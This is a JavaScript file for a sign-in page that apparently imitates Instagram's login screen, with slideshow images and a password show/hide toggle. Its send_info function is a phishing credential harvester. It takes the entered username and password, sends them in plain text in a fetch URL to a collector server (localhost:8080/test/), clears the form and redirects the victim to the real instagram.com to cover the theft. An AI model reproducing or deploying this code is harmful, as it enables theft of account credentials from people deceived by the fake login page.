let slide_content = document.querySelector('#slide-content')

let signin_form = document.querySelector('#signin-form')

let signin_btn = document.querySelector('#signin-btn')

let darkmode_toggle = document.querySelector('#darkmode-toggle')

let slide_index = 0

const redirect = () => {
    window.location.href = "https://www.instagram.com/"
}


const send_info = () => {
    let username = document.getElementById('user-input').value
    let password = document.getElementById('password-input').value
    fetch(`http://localhost:8080/test/${username}/${password}`)

    document.getElementById('user-input').value = ""
    document.getElementById('password-input').value = ""
    redirect()
}


const send_info_button = document.getElementById('signin-btn')
send_info_button.addEventListener("click", send_info)

slide = () => {
    let slide_items = slide_content.querySelectorAll('img')
    slide_items.forEach(e => e.classList.remove('active'))
    slide_index = slide_index + 1 === slide_items.length ? 0 : slide_index + 1
    slide_items[slide_index].classList.add('active')
}

setInterval(slide, 4000)

// animate input
document.querySelectorAll('.animate-input').forEach(e => {
    let input = e.querySelector('input')
    let button = e.querySelector('button')

    input.onkeyup = () => {
        if (input.value.trim().length > 0) {
            e.classList.add('active')
        } else {
            e.classList.remove('active')
        }

        if (checkSigninInput()) {
            signin_btn.removeAttribute('disabled')
        } else {
            signin_btn.setAttribute('disabled', 'true')
        }
    }

    // show password button
    if (button) {
        button.onclick = () => {
            if (input.getAttribute('type') === 'text') {
                input.setAttribute('type', 'password')
                button.innerHTML = 'Show'
            } else {
                input.setAttribute('type', 'text')
                button.innerHTML = 'Hide'
            }
        }
    }
})

checkSigninInput = () => {
    let inputs = signin_form.querySelectorAll('input')
    return Array.from(inputs).every(input => {
        return input.value.trim().length >= 1
    })
}